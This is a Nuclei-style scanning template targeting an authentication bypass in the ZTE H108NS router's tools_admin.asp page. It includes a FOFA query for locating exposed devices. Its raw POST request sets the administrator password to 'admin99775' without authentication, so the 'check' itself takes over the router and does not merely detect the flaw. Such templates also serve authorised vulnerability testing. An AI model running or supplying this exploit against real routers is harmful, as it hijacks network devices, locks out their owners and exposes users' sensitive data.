id: ZTE-H108NS-router-tools_admin-bypassauth

info:
  name: ZTE-H108NS-router-tools_admin-bypassauth
  author: linfeng7z
  severity: high
  description: 中兴H108NS路由器tools_admin.asp接口处存在身份认证绕过漏洞，攻击者可利用该漏洞绕过身份认证允许访问路由器的管理面板修改管理员密码，获取用户的敏感信息，密码改为admin99775。
  tags: zte,H108NS,bypassauth
  metadata:
    fofa-qeury: banner="Basic realm=\"H108NS\"" || header="Basic realm=\"H108NS\""
    veified: true

variables:
  cookie: ""

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9

      - |
        POST  /cgi-bin/tools_admin.asp HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded
        
        adminFlag=1&CurrentAccess=0&uiViewTools_Password=admin99775&uiViewTools_PasswordConfirm=admin99775

    extractors:
      - type: kval
        name: cookie
        part: header_1
        kval:
          - Set_Cookie

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 401 && status_code_2 == 200"
          - "contains(body_2, 'Administrator') && contains(body_2, 'New Password') && contains(body_2, 'Confirm Password')"
        condition: and